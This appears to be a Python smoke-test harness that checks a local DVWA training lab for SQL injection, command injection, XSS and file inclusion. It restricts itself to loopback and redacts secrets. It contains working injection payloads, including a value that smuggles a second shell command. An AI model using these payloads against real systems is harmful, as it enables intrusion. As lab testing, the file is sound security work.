"""Safe, deterministic dynamic smoke checks for a local DVWA instance.

This harness is intentionally narrow. It only accepts loopback URLs, keeps
redirects on the same origin, and uses point-to-proof payloads that do not
modify the host outside DVWA's own guestbook database.
"""

from __future__ import annotations

import argparse
import html
import http.client
import ipaddress
import json
import os
import re
import sys
from dataclasses import dataclass, field
from datetime import UTC, datetime
from html.parser import HTMLParser
from pathlib import Path
from typing import Any, Protocol
from urllib.parse import urlencode, urljoin, urlsplit, urlunsplit

DEFAULT_BASE_URL = "http://127.0.0.1:4280"
DEFAULT_OUTPUT = "workspace/dvwa-dynamic-evidence.json"
USER_AGENT = "AuditForge-DVWA-Smoke/1.0"

SQLI_PAYLOAD = "1' OR '1'='1' LIMIT 2#"
COMMAND_MARKER = "AF_DVWA_CMD_PROOF"
COMMAND_PAYLOAD = f"127.0.0.1; echo {COMMAND_MARKER}"
REFLECTED_XSS_MARKER = "AF_DVWA_RXSS_PROOF"
REFLECTED_XSS_PAYLOAD = f"<svg onload=document.title='{REFLECTED_XSS_MARKER}'>"
STORED_XSS_MARKER = "AF_DVWA_SXSS_PROOF"
STORED_XSS_PAYLOAD = f"<svg onload=document.title='{STORED_XSS_MARKER}'>"
DOM_XSS_MARKER = "AF_DVWA_DXSS_PROOF"
DOM_XSS_PAYLOAD = f"English</option><svg onload=document.title='{DOM_XSS_MARKER}'>"
FILE_READ_PAYLOAD = "../../robots.txt"

_SENSITIVE_HEADERS = {
    "authorization",
    "cookie",
    "proxy-authorization",
    "set-cookie",
    "x-csrf-token",
    "x-xsrf-token",
}
_SENSITIVE_FIELDS = ("user_token", "csrf_token", "csrfmiddlewaretoken", "password")


class HarnessError(RuntimeError):
    """A deterministic setup or validation failure."""


@dataclass(slots=True)
class HttpExchange:
    request_method: str
    request_url: str
    request_headers: list[tuple[str, str]]
    request_body: str
    response_status: int
    response_reason: str
    response_headers: list[tuple[str, str]]
    response_body: str
    response_http_version: str = "HTTP/1.1"


@dataclass(slots=True)
class HttpResult:
    status: int
    reason: str
    url: str
    headers: list[tuple[str, str]]
    body: str
    exchanges: list[HttpExchange] = field(default_factory=list)


class HttpClient(Protocol):
    def request(
        self,
        method: str,
        path: str,
        data: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
    ) -> HttpResult: ...


def validate_loopback_base_url(value: str) -> str:
    """Return a canonical loopback base URL or raise ValueError."""

    parsed = urlsplit(value)
    if parsed.scheme not in {"http", "https"}:
        raise ValueError("DVWA base URL must use http or https")
    if parsed.username or parsed.password:
        raise ValueError("Credentials are not allowed in the DVWA base URL")
    if parsed.query or parsed.fragment:
        raise ValueError("DVWA base URL must not contain a query or fragment")
    if not parsed.hostname:
        raise ValueError("DVWA base URL must include a host")

    hostname = parsed.hostname.rstrip(".").lower()
    if hostname != "localhost":
        try:
            address = ipaddress.ip_address(hostname)
        except ValueError as exc:
            raise ValueError("DVWA host must be localhost or a literal loopback IP") from exc
        if not address.is_loopback:
            raise ValueError("DVWA host must be a loopback address")

    # Accessing .port validates malformed and out-of-range port strings.
    try:
        port = parsed.port
    except ValueError as exc:
        raise ValueError("DVWA base URL has an invalid port") from exc
    default_port = 443 if parsed.scheme == "https" else 80
    host_for_url = f"[{hostname}]" if ":" in hostname else hostname
    netloc = host_for_url if port in {None, default_port} else f"{host_for_url}:{port}"
    path = parsed.path.rstrip("/")
    return urlunsplit((parsed.scheme, netloc, path, "", ""))


def _origin(url: str) -> tuple[str, str, int]:
    parsed = urlsplit(url)
    default_port = 443 if parsed.scheme == "https" else 80
    return parsed.scheme, (parsed.hostname or "").rstrip(".").lower(), parsed.port or default_port


def _decode_body(body: bytes, headers: list[tuple[str, str]]) -> str:
    content_type = next((value for name, value in headers if name.lower() == "content-type"), "")
    charset_match = re.search(r"charset\s*=\s*[\"']?([^;\s\"']+)", content_type, re.IGNORECASE)
    charset = charset_match.group(1) if charset_match else "utf-8"
    try:
        return body.decode(charset)
    except (LookupError, UnicodeDecodeError):
        return body.decode("utf-8", errors="replace")


class LoopbackHttpClient:
    """Small HTTP client with a cookie jar and explicit safe redirects."""

    def __init__(self, base_url: str, timeout: float = 15.0, max_redirects: int = 5) -> None:
        self.base_url = validate_loopback_base_url(base_url)
        self.timeout = timeout
        self.max_redirects = max_redirects
        self.cookies: dict[str, str] = {}
        self._origin = _origin(self.base_url)

    def request(
        self,
        method: str,
        path: str,
        data: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
    ) -> HttpResult:
        url = urljoin(f"{self.base_url}/", path)
        body = urlencode(data).encode("utf-8") if data is not None else b""
        request_headers = dict(headers or {})
        if data is not None:
            request_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        exchanges: list[HttpExchange] = []
        current_method = method.upper()

        for redirect_count in range(self.max_redirects + 1):
            if _origin(url) != self._origin:
                raise HarnessError(f"Refusing cross-origin redirect to {url}")
            result = self._request_once(current_method, url, body, request_headers)
            exchanges.append(result.exchanges[0])
            location = next(
                (value for name, value in result.headers if name.lower() == "location"),
                None,
            )
            if result.status not in {301, 302, 303, 307, 308} or not location:
                result.exchanges = exchanges
                return result
            if redirect_count >= self.max_redirects:
                raise HarnessError("DVWA exceeded the redirect limit")

            url = urljoin(url, location)
            redirected = urlsplit(url)
            if redirected.username or redirected.password or _origin(url) != self._origin:
                raise HarnessError(f"Refusing unsafe redirect to {url}")
            if result.status == 303 or (result.status in {301, 302} and current_method == "POST"):
                current_method = "GET"
                body = b""
                request_headers.pop("Content-Type", None)

        raise AssertionError("unreachable")

    def _request_once(
        self,
        method: str,
        url: str,
        body: bytes,
        headers: dict[str, str],
    ) -> HttpResult:
        parsed = urlsplit(url)
        connection_type = http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
        connection = connection_type(parsed.hostname, parsed.port, timeout=self.timeout)
        target = urlunsplit(("", "", parsed.path or "/", parsed.query, ""))
        outgoing = {
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Encoding": "identity",
            "User-Agent": USER_AGENT,
            **headers,
        }
        if self.cookies:
            outgoing["Cookie"] = "; ".join(f"{name}={value}" for name, value in sorted(self.cookies.items()))
        if body:
            outgoing["Content-Length"] = str(len(body))

        try:
            connection.request(method, target, body=body or None, headers=outgoing)
            response = connection.getresponse()
            response_body_bytes = response.read()
            response_headers = response.getheaders()
        except OSError as exc:
            raise HarnessError(f"DVWA request failed for {url}: {exc}") from exc
        finally:
            connection.close()

        self._update_cookies(response_headers)
        response_body = _decode_body(response_body_bytes, response_headers)
        request_header_list = [("Host", parsed.netloc), *outgoing.items()]
        exchange = HttpExchange(
            request_method=method,
            request_url=url,
            request_headers=request_header_list,
            request_body=body.decode("utf-8", errors="replace"),
            response_status=response.status,
            response_reason=response.reason,
            response_headers=response_headers,
            response_body=response_body,
            response_http_version="HTTP/1.1" if response.version == 11 else "HTTP/1.0",
        )
        return HttpResult(
            status=response.status,
            reason=response.reason,
            url=url,
            headers=response_headers,
            body=response_body,
            exchanges=[exchange],
        )

    def _update_cookies(self, headers: list[tuple[str, str]]) -> None:
        for name, value in headers:
            if name.lower() != "set-cookie":
                continue
            pair = value.split(";", 1)[0]
            if "=" not in pair:
                continue
            cookie_name, cookie_value = pair.split("=", 1)
            if cookie_value:
                self.cookies[cookie_name.strip()] = cookie_value.strip()
            else:
                self.cookies.pop(cookie_name.strip(), None)


class _TokenParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.token: str | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag.lower() != "input":
            return
        attributes = {name.lower(): value for name, value in attrs}
        if attributes.get("name") == "user_token" and attributes.get("value"):
            self.token = attributes["value"]


def extract_user_token(body: str) -> str:
    parser = _TokenParser()
    parser.feed(body)
    if not parser.token:
        raise HarnessError("DVWA response did not contain a user_token")
    return parser.token


def _redact_text(value: str) -> str:
    redacted = value
    for field_name in _SENSITIVE_FIELDS:
        redacted = re.sub(
            rf"(?i)((?:^|[?&]){re.escape(field_name)}=)[^&\s]*",
            r"\1[REDACTED]",
            redacted,
        )
        redacted = re.sub(
            rf"(?i)(name\s*=\s*['\"]{re.escape(field_name)}['\"][^>]*?value\s*=\s*['\"])[^'\"]*",
            r"\1[REDACTED]",
            redacted,
        )
        redacted = re.sub(
            rf"(?i)(value\s*=\s*['\"])[^'\"]*(['\"][^>]*?name\s*=\s*['\"]{re.escape(field_name)}['\"])",
            r"\1[REDACTED]\2",
            redacted,
        )
    return redacted


def _redact_headers(headers: list[tuple[str, str]]) -> list[tuple[str, str]]:
    return [(name, "[REDACTED]" if name.lower() in _SENSITIVE_HEADERS else _redact_text(value)) for name, value in headers]


def _packet_request(exchange: HttpExchange, headers: list[tuple[str, str]], body: str, url: str) -> str:
    parsed = urlsplit(url)
    target = urlunsplit(("", "", parsed.path or "/", parsed.query, ""))
    lines = [f"{exchange.request_method} {target} HTTP/1.1"]
    lines.extend(f"{name}: {value}" for name, value in headers)
    return "\r\n".join([*lines, "", body])


def _packet_response(exchange: HttpExchange, headers: list[tuple[str, str]], body: str) -> str:
    lines = [f"{exchange.response_http_version} {exchange.response_status} {exchange.response_reason}"]
    lines.extend(f"{name}: {value}" for name, value in headers)
    return "\r\n".join([*lines, "", body])


def redact_exchange(exchange: HttpExchange) -> dict[str, Any]:
    request_url = _redact_text(exchange.request_url)
    request_headers = _redact_headers(exchange.request_headers)
    request_body = _redact_text(exchange.request_body)
    response_headers = _redact_headers(exchange.response_headers)
    response_body = _redact_text(exchange.response_body)
    return {
        "request": {
            "method": exchange.request_method,
            "url": request_url,
            "headers": [{"name": name, "value": value} for name, value in request_headers],
            "body": request_body,
            "packet": _packet_request(exchange, request_headers, request_body, request_url),
        },
        "response": {
            "status": exchange.response_status,
            "reason": exchange.response_reason,
            "headers": [{"name": name, "value": value} for name, value in response_headers],
            "body": response_body,
            "packet": _packet_response(exchange, response_headers, response_body),
        },
    }


class DvwaSmokeHarness:
    def __init__(
        self,
        client: HttpClient,
        base_url: str,
        username: str = "admin",
        password: str = "password",
        reset_database: bool = True,
    ) -> None:
        self.client = client
        self.base_url = validate_loopback_base_url(base_url)
        self.username = username
        self.password = password
        self.reset_database = reset_database
        self.setup_evidence: list[dict[str, Any]] = []

    @staticmethod
    def _evidence(result: HttpResult) -> list[dict[str, Any]]:
        return [redact_exchange(exchange) for exchange in result.exchanges]

    @staticmethod
    def _require_ok(result: HttpResult, step: str) -> None:
        if result.status != 200:
            raise HarnessError(f"{step} returned HTTP {result.status}")

    def initialize(self) -> None:
        if self.reset_database:
            setup_page = self.client.request("GET", "setup.php")
            self.setup_evidence.extend(self._evidence(setup_page))
            self._require_ok(setup_page, "DVWA setup page")
            token = extract_user_token(setup_page.body)
            setup_result = self.client.request(
                "POST",
                "setup.php",
                {"create_db": "Create / Reset Database", "user_token": token},
            )
            self.setup_evidence.extend(self._evidence(setup_result))
            self._require_ok(setup_result, "DVWA database setup")

        login_page = self.client.request("GET", "login.php")
        self.setup_evidence.extend(self._evidence(login_page))
        self._require_ok(login_page, "DVWA login page")
        login_token = extract_user_token(login_page.body)
        login_result = self.client.request(
            "POST",
            "login.php",
            {
                "username": self.username,
                "password": self.password,
                "Login": "Login",
                "user_token": login_token,
            },
        )
        self.setup_evidence.extend(self._evidence(login_result))
        self._require_ok(login_result, "DVWA login")
        if "login.php" in login_result.url and "Login failed" in login_result.body:
            raise HarnessError("DVWA login failed")

        security_page = self.client.request("GET", "security.php")
        self.setup_evidence.extend(self._evidence(security_page))
        self._require_ok(security_page, "DVWA security page")
        security_token = extract_user_token(security_page.body)
        security_result = self.client.request(
            "POST",
            "security.php",
            {"security": "low", "seclev_submit": "Submit", "user_token": security_token},
        )
        self.setup_evidence.extend(self._evidence(security_result))
        self._require_ok(security_result, "DVWA security level update")
        if not re.search(r"Security level is currently:\s*<em>low</em>", security_result.body, re.IGNORECASE):
            raise HarnessError("DVWA did not confirm the low security level")

    def _result(
        self,
        name: str,
        passed: bool,
        proof: str,
        result: HttpResult,
        extra_results: tuple[HttpResult, ...] = (),
    ) -> dict[str, Any]:
        all_results = (*extra_results, result)
        return {
            "name": name,
            "status": "passed" if passed else "failed",
            "proof": proof,
            "evidence": [item for response in all_results for item in self._evidence(response)],
        }

    def check_sqli(self) -> dict[str, Any]:
        baseline = self.client.request("GET", "vulnerabilities/sqli/?" + urlencode({"id": "1", "Submit": "Submit"}))
        injected = self.client.request(
            "GET",
            "vulnerabilities/sqli/?" + urlencode({"id": SQLI_PAYLOAD, "Submit": "Submit"}),
        )
        count = len(re.findall(r"First name:", injected.body, re.IGNORECASE))
        baseline_count = len(re.findall(r"First name:", baseline.body, re.IGNORECASE))
        passed = injected.status == 200 and count == 2 and baseline_count == 1
        return self._result(
            "sqli",
            passed,
            f"Limited UNION-free boolean payload returned {count} rows versus {baseline_count} baseline row; capped at 2.",
            injected,
            (baseline,),
        )

    def check_command_injection(self) -> dict[str, Any]:
        result = self.client.request(
            "POST",
            "vulnerabilities/exec/",
            {"ip": COMMAND_PAYLOAD, "Submit": "Submit"},
        )
        passed = result.status == 200 and COMMAND_MARKER in result.body
        return self._result(
            "command_injection",
            passed,
            f"The response {'contained' if passed else 'did not contain'} the marker printed by an echo-only injected command.",
            result,
        )

    def check_reflected_xss(self) -> dict[str, Any]:
        result = self.client.request(
            "GET",
            "vulnerabilities/xss_r/?" + urlencode({"name": REFLECTED_XSS_PAYLOAD}),
        )
        passed = result.status == 200 and REFLECTED_XSS_PAYLOAD in html.unescape(result.body)
        return self._result(
            "reflected_xss",
            passed,
            "A benign SVG onload marker was returned without HTML encoding; it only changes document.title.",
            result,
        )

    def check_stored_xss(self) -> dict[str, Any]:
        write_result = self.client.request(
            "POST",
            "vulnerabilities/xss_s/",
            {"txtName": "AFSmoke", "mtxMessage": STORED_XSS_PAYLOAD, "btnSign": "Sign Guestbook"},
        )
        read_result = self.client.request("GET", "vulnerabilities/xss_s/")
        passed = write_result.status == 200 and read_result.status == 200 and STORED_XSS_PAYLOAD in html.unescape(read_result.body)
        return self._result(
            "stored_xss",
            passed,
            "A benign persisted SVG onload marker was read back without HTML encoding; it only changes document.title.",
            read_result,
            (write_result,),
        )

    def check_dom_xss(self) -> dict[str, Any]:
        path = "vulnerabilities/xss_d/?" + urlencode({"default": DOM_XSS_PAYLOAD})
        result = self.client.request("GET", path)
        body = result.body
        has_source_sink = "document.location.href" in body and "document.write" in body and "decodeURI(lang)" in body
        passed = result.status == 200 and has_source_sink and DOM_XSS_MARKER in result.url
        return self._result(
            "dom_xss",
            passed,
            "The marker reached the URL-controlled lang source and the live page exposed its decodeURI-to-document.write sink. No data leaves DVWA.",
            result,
        )

    def check_file_inclusion(self) -> dict[str, Any]:
        result = self.client.request(
            "GET",
            "vulnerabilities/fi/?" + urlencode({"page": FILE_READ_PAYLOAD}),
        )
        passed = result.status == 200 and "User-agent: *" in result.body and "Disallow: /" in result.body
        return self._result(
            "file_inclusion",
            passed,
            "Read only DVWA's two-line robots.txt through a relative include; no host files were requested.",
            result,
        )

    def run(self) -> dict[str, Any]:
        self.initialize()
        checks = [
            self.check_sqli,
            self.check_command_injection,
            self.check_reflected_xss,
            self.check_stored_xss,
            self.check_dom_xss,
            self.check_file_inclusion,
        ]
        results: list[dict[str, Any]] = []
        for check in checks:
            try:
                results.append(check())
            except Exception as exc:  # Continue so one lab cannot hide the remaining coverage.
                results.append(
                    {
                        "name": check.__name__.removeprefix("check_"),
                        "status": "error",
                        "proof": f"{type(exc).__name__}: {exc}",
                        "evidence": [],
                    }
                )
        passed = sum(item["status"] == "passed" for item in results)
        return {
            "schema_version": 1,
            "generated_at": datetime.now(UTC).isoformat(),
            "target": self.base_url,
            "safety": {
                "loopback_only": True,
                "same_origin_redirects_only": True,
                "database_reset": self.reset_database,
                "secrets_redacted": True,
                "command_payload": "echo only",
                "file_read_scope": "DVWA robots.txt only",
            },
            "summary": {"passed": passed, "total": len(results), "all_passed": passed == len(results)},
            "setup_evidence": self.setup_evidence,
            "checks": results,
        }


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL, help="Loopback DVWA URL")
    parser.add_argument("--output", default=DEFAULT_OUTPUT, help="JSON evidence output path")
    parser.add_argument("--username", default=os.environ.get("DVWA_USERNAME", "admin"))
    parser.add_argument("--password", default=os.environ.get("DVWA_PASSWORD", "password"))
    parser.add_argument("--skip-reset", action="store_true", help="Do not reset the DVWA database before login")
    parser.add_argument("--timeout", type=float, default=15.0)
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    try:
        base_url = validate_loopback_base_url(args.base_url)
        client = LoopbackHttpClient(base_url, timeout=args.timeout)
        harness = DvwaSmokeHarness(
            client,
            base_url,
            username=args.username,
            password=args.password,
            reset_database=not args.skip_reset,
        )
        report = harness.run()
    except (HarnessError, ValueError) as exc:
        print(f"DVWA smoke validation failed during setup: {exc}", file=sys.stderr)
        return 2

    output_path = Path(args.output).resolve()
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(json.dumps(report, indent=2, ensure_ascii=True) + "\n", encoding="utf-8")
    summary = report["summary"]
    print(f"DVWA dynamic smoke: {summary['passed']}/{summary['total']} passed")
    print(f"Redacted evidence: {output_path}")
    return 0 if summary["all_passed"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
